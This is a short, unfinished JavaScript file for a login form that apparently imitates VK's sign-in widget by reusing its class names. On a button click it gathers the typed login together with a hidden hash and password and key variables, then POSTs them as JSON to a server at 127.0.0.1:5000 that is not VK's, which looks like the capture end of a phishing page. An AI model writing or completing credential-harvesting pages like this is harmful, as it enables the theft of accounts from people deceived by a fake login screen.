console.log('2')


window.onload = () => {
    let HASH = document.querySelector("#hash").value
    let LOGIN
    let PASSWORD
    let KEY

    // click to LOGIN
    document.querySelector('.vkc__EnterLogin__button').addEventListener('click', () => {
        LOGIN = document.querySelector('.vkc__TextField__input').value
        sendServer()
    })

    // validator input
    setInterval(() => { 
        if (document.querySelector('.vkc__TextField__input').value != '')
        {
            document.querySelector('.vkc__Button__container').classList.remove("vkc__Button__disabled")
        }
        else
        {
            document.querySelector('.vkc__Button__container').classList.add("vkc__Button__disabled")
        }
            
    }, 800)

    // sending to server
    function sendServer()
    {
        // console.log('__send__')
        // console.log(POST)
        let POST = {
            'HASH':HASH,
            'LOGIN':LOGIN,
            'PASSWORD':PASSWORD,
            'KEY':KEY,
        }

        let response = fetch('http://127.0.0.1:5000/API', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json;charset=utf-8'
            },
            body: JSON.stringify(POST)
        })

        // let result = response.json()


        console.log('send')
        console.log(POST)
    }
}

 

// vkc__Button__disabled
// element.classList.remove("mystyle");